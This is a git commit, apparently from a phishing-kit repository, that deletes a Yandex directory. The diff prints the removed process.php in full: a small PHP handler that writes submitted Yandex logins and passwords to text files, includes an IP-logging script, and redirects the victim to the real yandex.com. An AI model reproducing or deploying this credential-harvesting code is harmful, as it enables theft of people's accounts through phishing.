7c8ff5f93aa6d8661e370f38a968f94bdc33d115
Mr.Ruthless Devil <77040067+RDXLR@users.noreply.github.com>
2022-04-07 15:39:04 +0530

    Delete yandex directory

--- yandex/process.php
+++
@@ -1,8 +0,0 @@
-<?php
-include 'ip.php';
-file_put_contents("usernames.txt", "Yandex Username : " . $email = $_POST['login'] . "\n", FILE_APPEND);
-?>
-<?php
-file_put_contents("pass.txt", "Yandex Password : " . $pass = $_POST['passwd'] . "\n", FILE_APPEND);
-header('Location: https://yandex.com/');
-?>
